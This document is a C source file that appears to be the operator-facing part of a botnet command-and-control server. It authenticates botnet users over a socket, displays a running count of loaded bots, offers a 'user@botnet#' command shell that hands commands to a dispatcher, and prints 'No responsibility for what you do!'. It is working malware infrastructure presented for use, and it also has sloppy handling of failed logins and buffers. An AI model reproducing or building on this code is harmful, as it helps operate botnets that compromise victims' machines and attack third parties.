#include "user_handler.h"
#include "botnet.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int user_sockets[MAX_USERS] = {0};

void* update_title(void* arg) {
    int client_socket = *((int*)arg);
    free(arg);

    while (1) {
        int valid_bots = 0;

        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].is_valid) {
                valid_bots++;
            }
        }
        pthread_mutex_unlock(&bot_mutex);

        char buffer[15000];
        sprintf(buffer, "\0337\033]0;Bots Loaded: %d\007\0338", valid_bots);
        if (client_socket > 0) {
            send(client_socket, buffer, strlen(buffer), 0);
        }

        sleep(2);
    }

    return NULL;
}

void* handle_client(void* arg) {
    int client_socket = *((int*)arg);
    free(arg);

    char buffer[4096];
    sprintf(buffer, "\r" YELLOW "\rLogin: " RESET);
    send(client_socket, buffer, strlen(buffer), 0);

    usleep(2800000);

    char username[4048], password[4048];
    memset(username, 0, 4048);
    memset(password, 0, 4048);

    recv(client_socket, username, sizeof(username), 0);
    username[strcspn(username, "\r\n")] = 0;

    sprintf(buffer, "\r" YELLOW "\rPassword: " RESET);
    send(client_socket, buffer, strlen(buffer), 0);
    usleep(2800000);

    recv(client_socket, password, sizeof(password), 0);
    password[strcspn(password, "\r\n")] = 0;

    int user_index = check_login(username, password);
    if (user_index == -1) {
        sprintf(buffer, "\r" RED "\rInvalid login\r" RESET);
        send(client_socket, buffer, strlen(buffer), 0);
        close(client_socket);
    }

    while (user_index == -2) {
        sprintf(buffer, "\r" YELLOW "\rUser connected already, Disconnect? Y/N:\r " RESET);
        send(client_socket, buffer, strlen(buffer), 0);

        char response[2];
        recv(client_socket, response, sizeof(response), 0);
        response[strcspn(response, "\r\n")] = 0;

        if (strcmp(response, "Y") == 0 || strcmp(response, "y") == 0) {
            for (int i = 0; i < user_count; i++) {
                if (strcmp(username, users[i].user) == 0 && strcmp(password, users[i].pass) == 0) {
                    if (user_sockets[i] != 0) {
                        shutdown(user_sockets[i], SHUT_RDWR);
                        close(user_sockets[i]);
                        user_sockets[i] = 0;
                    }
                    users[i].is_logged_in = 0;
                }
            }
            user_index = check_login(username, password);
        } else {
            close(client_socket);
            return NULL;
        }
    }

    if (user_index >= 0) {
        User *user = &users[user_index];
        user->is_logged_in = 1;
        user_sockets[user_index] = client_socket;
        sprintf(buffer, "\rWelcome!\r\nNo responsibility for what you do!\n\r");
        send(client_socket, buffer, strlen(buffer), 0);

        pthread_t update_thread;
        int *update_arg = malloc(sizeof(int));
        *update_arg = client_socket;
        pthread_create(&update_thread, NULL, update_title, update_arg);
        pthread_detach(update_thread);

        char command[MAX_COMMAND_LENGTH];
        while (1) {
            char prompt[MAX_COMMAND_LENGTH];
            sprintf(prompt, RED "%s@botnet# " RESET, user->user);
            sprintf(buffer, "\r%s", prompt);
            send(client_socket, buffer, strlen(buffer), 0);

            memset(command, 0, sizeof(command));
            int len = recv(client_socket, command, sizeof(command), 0);
            if (len <= 0) {
                close(client_socket);
                user->is_logged_in = 0;
                user_sockets[user_index] = 0;
                break;
            }
            command[strcspn(command, "\r\n")] = 0;

            if (strlen(command) == 0) {
                continue;
            }

            sprintf(buffer, "\r\n");
            send(client_socket, buffer, strlen(buffer), 0);

            process_command(user, command, client_socket);
        }
    }

    return NULL;
}
